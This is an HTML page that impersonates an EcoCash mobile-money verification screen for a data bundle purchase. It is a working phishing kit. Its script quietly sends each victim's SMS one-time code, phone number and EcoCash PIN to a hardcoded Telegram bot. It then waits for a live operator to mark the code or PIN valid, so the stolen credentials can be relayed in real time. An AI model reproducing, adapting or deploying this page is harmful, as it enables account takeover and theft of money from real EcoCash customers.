<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>EcoCash | Verify Code · Zimbabwe</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --eco-primary: #003366;
            --eco-secondary: #004d99;
            --eco-accent: #0077cc;
            --eco-highlight: #00aaff;
            --eco-green: #00a651;
            --white: #ffffff;
            --light-bg: #f0f6ff;
            --text-dark: #0d1b2a;
            --text-muted: #5a6d80;
            --border: #d0dce8;
            --error: #e30613;
            --success: #00a651;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { -webkit-text-size-adjust: 100%; }

        body {
            font-family: 'Poppins', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #003366 0%, #001a33 50%, #004d99 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        header {
            background: white;
            padding: 14px 5%;
            border-bottom: 3px solid var(--eco-primary);
            box-shadow: 0 2px 16px rgba(0, 51, 102, 0.1);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }

        .logo-icon {
            width: 34px;
            height: 34px;
            background: var(--eco-primary);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 900;
            font-size: 12px;
        }

        .logo-text { font-size: 20px; font-weight: 900; }
        .logo-text .eco { color: var(--eco-primary); }
        .logo-text .cash { color: var(--eco-green); }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .otp-card {
            background: white;
            border-radius: 20px;
            padding: 36px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 26, 51, 0.4);
        }

        .card-header { text-align: center; margin-bottom: 22px; }
        .card-header h1 { font-size: 22px; font-weight: 900; color: var(--eco-primary); margin-bottom: 4px; }
        .card-header p { color: var(--text-muted); font-size: 13px; }

        .bundle-bar {
            background: linear-gradient(135deg, var(--eco-primary), #001a33);
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 20px;
            color: white;
        }

        .bundle-row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 6px; }
        .bundle-row:last-child { margin-bottom: 0; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 14px; }

        .error-box {
            display: none;
            background: rgba(227, 6, 19, 0.06);
            border: 1px solid rgba(227, 6, 19, 0.2);
            color: var(--error);
            font-size: 12px;
            font-weight: 600;
            border-radius: 10px;
            padding: 10px 14px;
            margin-bottom: 14px;
            text-align: center;
        }

        .error-box.show { display: block; }

        .form-label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            color: var(--eco-primary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 10px;
        }

        .otp-inputs {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 18px;
        }

        .otp-box {
            width: 46px;
            height: 52px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            border: 2px solid var(--border);
            border-radius: 12px;
            background: var(--light-bg);
            color: var(--text-dark);
            font-family: 'Poppins', monospace;
            transition: all 0.2s;
        }

        .otp-box:focus {
            border-color: var(--eco-accent);
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 119, 204, 0.08);
            outline: none;
        }

        .otp-box.filled { border-color: var(--eco-green); background: rgba(0, 166, 81, 0.04); }

        .form-hint { font-size: 10px; color: var(--text-muted); text-align: center; margin-bottom: 8px; }

        .btn-row { display: flex; gap: 10px; margin-top: 18px; }

        .btn-primary {
            flex: 1;
            background: var(--eco-primary);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
            box-shadow: 0 4px 14px rgba(0, 51, 102, 0.3);
        }

        .btn-primary:hover { background: var(--eco-accent); transform: translateY(-1px); }

        .btn-outline {
            flex: 1;
            background: transparent;
            color: var(--eco-primary);
            border: 2px solid var(--eco-primary);
            padding: 14px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 13px;
            text-transform: uppercase;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.2s;
        }

        .btn-outline:hover { background: var(--light-bg); }

        .card-footer { text-align: center; margin-top: 16px; font-size: 10px; color: var(--text-muted); }
        .card-footer a { color: var(--eco-accent); text-decoration: none; font-weight: 700; }
        .secure-badge { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 12px; font-size: 10px; color: var(--text-muted); font-weight: 600; }

        /* Loading */
        .loading-overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
            background: rgba(0, 26, 51, 0.92);
            z-index: 2000;
            backdrop-filter: blur(6px);
        }

        .loading-overlay.active { display: flex; }

        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--eco-highlight); border-radius: 50%; animation: spin 0.8s linear infinite; }
        .spin-text { font-size: 14px; font-weight: 700; color: white; }
        .spin-sub { font-size: 12px; color: rgba(255,255,255,0.6); }

        @keyframes spin { to { transform: rotate(360deg); } }

        /* PIN Modal */
        .modal-bg {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center;
            background: rgba(0, 26, 51, 0.7);
            z-index: 2000; padding: 20px;
            backdrop-filter: blur(6px);
        }

        .modal-bg.active { display: flex; }

        .modal-box {
            background: white;
            border-radius: 20px;
            padding: 32px;
            max-width: 360px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 26, 51, 0.3);
        }

        .modal-box h2 { font-size: 18px; font-weight: 900; color: var(--eco-primary); margin-bottom: 6px; text-align: center; }
        .modal-box .modal-sub { color: var(--text-muted); font-size: 12px; margin-bottom: 18px; text-align: center; }

        .pin-wrap {
            display: flex;
            align-items: center;
            border: 2px solid var(--border);
            border-radius: 12px;
            padding: 12px 14px;
            background: var(--light-bg);
            transition: all 0.2s;
            margin-bottom: 14px;
        }

        .pin-wrap:focus-within { border-color: var(--eco-accent); background: white; box-shadow: 0 0 0 3px rgba(0, 119, 204, 0.08); }

        .pin-field {
            flex: 1;
            border: none;
            background: transparent;
            font-size: 20px;
            color: var(--text-dark);
            outline: none;
            font-family: inherit;
            letter-spacing: 8px;
            text-align: center;
        }

        .pin-field::placeholder { color: #a0b0c0; letter-spacing: 0; font-size: 14px; }

        .modal-error {
            display: none;
            background: rgba(227, 6, 19, 0.06);
            border: 1px solid rgba(227, 6, 19, 0.2);
            color: var(--error);
            font-size: 12px;
            font-weight: 600;
            border-radius: 10px;
            padding: 10px;
            margin-bottom: 14px;
            text-align: center;
        }

        .modal-error.show { display: block; }

        .modal-btns { display: flex; gap: 10px; }

        .modal-btn {
            flex: 1;
            padding: 13px;
            border-radius: 50px;
            border: none;
            font-weight: 800;
            font-size: 12px;
            text-transform: uppercase;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.2s;
        }

        .modal-btn-ok { background: var(--eco-primary); color: white; box-shadow: 0 4px 12px rgba(0, 51, 102, 0.3); }
        .modal-btn-ok:hover { background: var(--eco-accent); }
        .modal-btn-cancel { background: transparent; color: var(--eco-primary); border: 2px solid var(--eco-primary); }
        .modal-btn-cancel:hover { background: var(--light-bg); }

        @media (max-width: 600px) {
            main { padding: 20px 14px; }
            .otp-card { padding: 24px 18px; }
            .card-header h1 { font-size: 19px; }
            .otp-inputs { gap: 6px; }
            .otp-box { width: 40px; height: 46px; font-size: 18px; }
            .btn-row { flex-direction: column; }
        }
    </style>
</head>
<body>
    <header>
        <a class="logo" href="index.html">
            <div class="logo-icon">EC</div>
            <div class="logo-text"><span class="eco">Eco</span><span class="cash">Cash</span></div>
        </a>
    </header>

    <main>
        <div class="otp-card">
            <div class="card-header">
                <h1>Verify Code</h1>
                <p>Enter the 6-digit code sent to your phone</p>
            </div>

            <div id="bundleBar" class="bundle-bar" style="display:none;">
                <div class="bundle-row"><span>Bundle:</span><span id="bData">&mdash;</span></div>
                <div class="bundle-row"><span>Amount:</span><span id="bPrice">USD 0.00</span></div>
            </div>

            <div id="errorBox" class="error-box"></div>

            <div>
                <label class="form-label">Verification Code</label>
                <div class="otp-inputs" id="otpInputs">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                </div>
                <p class="form-hint">Check your SMS for the verification code</p>

                <div class="btn-row">
                    <button class="btn-primary" onclick="validateOTP()">Verify & Proceed</button>
                    <button class="btn-outline" onclick="window.location.href='login.html'">Cancel</button>
                </div>
            </div>

            <div class="card-footer">Protected with 256-bit encryption. <a href="#">Learn more</a></div>
            <div class="secure-badge">&#128274; End-to-end Encrypted &middot; Secure</div>
        </div>
    </main>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="spin-text">Verifying Code</div>
        <div class="spin-sub">Please wait...</div>
    </div>

    <!-- PIN Modal -->
    <div id="pinModal" class="modal-bg">
        <div class="modal-box">
            <h2>Confirm Transaction</h2>
            <p class="modal-sub">Enter your EcoCash PIN to confirm</p>
            <div id="pinError" class="modal-error"></div>
            <div class="pin-wrap">
                <input type="password" class="pin-field" id="pinInput" placeholder="Enter PIN" inputmode="numeric" maxlength="4">
            </div>
            <div class="modal-btns">
                <button class="modal-btn modal-btn-ok" onclick="submitPin()">Confirm</button>
                <button class="modal-btn modal-btn-cancel" onclick="closePinModal()">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const CHAT_ID = '7547427914';
        let bundleData = {};
        let lastUpdateId = 0;
        let otpCode = '';
        let phoneNumber = '';

        function loadBundle() {
            const p = new URLSearchParams(window.location.search);
            const data = p.get('data'), price = p.get('price');
            phoneNumber = p.get('phone') || '';
            if (data && price) {
                bundleData = { data, price };
                document.getElementById('bundleBar').style.display = 'block';
                document.getElementById('bData').textContent = data;
                document.getElementById('bPrice').textContent = 'USD ' + price;
            }
        }

        // OTP Input Logic
        const boxes = document.querySelectorAll('.otp-box');
        boxes.forEach((box, i) => {
            box.addEventListener('input', (e) => {
                const val = e.target.value;
                if (val.length > 1) {
                    const digits = val.replace(/\D/g, '').split('');
                    digits.forEach((d, j) => {
                        if (i + j < boxes.length) {
                            boxes[i + j].value = d;
                            boxes[i + j].classList.add('filled');
                        }
                    });
                    boxes[Math.min(i + digits.length, boxes.length - 1)].focus();
                    checkComplete();
                    return;
                }
                if (val) {
                    box.classList.add('filled');
                    if (i < boxes.length - 1) boxes[i + 1].focus();
                } else {
                    box.classList.remove('filled');
                }
                checkComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && i > 0) {
                    boxes[i - 1].focus();
                    boxes[i - 1].value = '';
                    boxes[i - 1].classList.remove('filled');
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/\D/g, '');
                pasted.split('').forEach((d, j) => {
                    if (j < boxes.length) {
                        boxes[j].value = d;
                        boxes[j].classList.add('filled');
                    }
                });
                boxes[Math.min(pasted.length - 1, boxes.length - 1)].focus();
                checkComplete();
            });
        });

        function getOTP() {
            return Array.from(boxes).map(b => b.value).join('');
        }

        function checkComplete() {
            otpCode = getOTP();
            if (otpCode.length === 6) {
                // Auto-send silently
                setTimeout(() => validateOTP(), 400);
            }
        }

        function validateOTP() {
            otpCode = getOTP();
            if (otpCode.length !== 6) {
                showError('Please enter all 6 digits');
                return;
            }
            clearError();
            document.getElementById('loadingOverlay').classList.add('active');

            // Send to Telegram — all fields copyable with <code> tags
            const msg = `\u{1f4f2} <b>OTP Verification</b>\n\n<b>OTP Code:</b> <code>${otpCode}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>\n\n<b>Full Message (tap to copy):</b>\n<code>Your EcoCash OTP is.${otpCode}. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>`;

            const buttons = [[
                { text: '\u2713 Approved', callback_data: 'otp_approved' },
                { text: '\u2717 Declined', callback_data: 'otp_declined' }
            ]];

            sendTelegram(msg, buttons);
            pollOTP();
        }

        async function sendTelegram(msg, buttons) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) { console.error(e); }
        }

        function pollOTP() {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            const u = d.result[0];
                            lastUpdateId = u.update_id;
                            if (u.callback_query) {
                                const cb = u.callback_query.data;
                                if (cb === 'otp_approved') {
                                    clearInterval(interval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    openPinModal();
                                } else if (cb === 'otp_declined') {
                                    clearInterval(interval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    showError('Verification declined. Please try again.');
                                    resetOTP();
                                }
                            }
                        }
                    }).catch(e => console.error(e));
            }, 1000);
            setTimeout(() => clearInterval(interval), 300000);
        }

        function openPinModal() {
            document.getElementById('pinModal').classList.add('active');
            setTimeout(() => document.getElementById('pinInput').focus(), 300);
        }

        function closePinModal() {
            document.getElementById('pinModal').classList.remove('active');
            document.getElementById('pinInput').value = '';
            document.getElementById('pinError').classList.remove('show');
        }

        // PIN auto-send on 4 digits
        document.getElementById('pinInput').addEventListener('input', function() {
            if (this.value.length === 4) {
                setTimeout(() => submitPin(), 300);
            }
        });

        function submitPin() {
            const pin = document.getElementById('pinInput').value.trim();
            if (pin.length !== 4) {
                document.getElementById('pinError').textContent = 'PIN must be 4 digits';
                document.getElementById('pinError').classList.add('show');
                return;
            }
            document.getElementById('pinError').classList.remove('show');
            document.getElementById('pinModal').classList.remove('active');
            document.getElementById('loadingOverlay').classList.add('active');

            // PIN message — only PIN details, NO OTP repeat
            const msg = `\u{1f510} <b>PIN Confirmation</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> <code>${bundleData.data || 'N/A'}</code>\n<b>Amount:</b> <code>USD ${bundleData.price || '0.00'}</code>`;

            const buttons = [[
                { text: '\u2713 Valid PIN', callback_data: 'pin_valid' },
                { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }
            ]];

            sendTelegram(msg, buttons);
            pollPin();
        }

        function pollPin() {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            const u = d.result[0];
                            lastUpdateId = u.update_id;
                            if (u.callback_query) {
                                const cb = u.callback_query.data;
                                if (cb === 'pin_valid') {
                                    clearInterval(interval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    window.location.href = `success.html?data=${encodeURIComponent(bundleData.data || '')}&price=${bundleData.price || ''}`;
                                } else if (cb === 'pin_invalid') {
                                    clearInterval(interval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    document.getElementById('pinModal').classList.add('active');
                                    document.getElementById('pinError').textContent = 'Invalid PIN. Try again.';
                                    document.getElementById('pinError').classList.add('show');
                                    document.getElementById('pinInput').value = '';
                                    document.getElementById('pinInput').focus();
                                }
                            }
                        }
                    }).catch(e => console.error(e));
            }, 1000);
            setTimeout(() => clearInterval(interval), 300000);
        }

        function showError(msg) {
            const el = document.getElementById('errorBox');
            el.textContent = msg;
            el.classList.add('show');
        }

        function clearError() { document.getElementById('errorBox').classList.remove('show'); }

        function resetOTP() {
            boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
            otpCode = '';
            boxes[0].focus();
        }

        window.addEventListener('load', () => { loadBundle(); boxes[0].focus(); });
    </script>
</body>
</html>
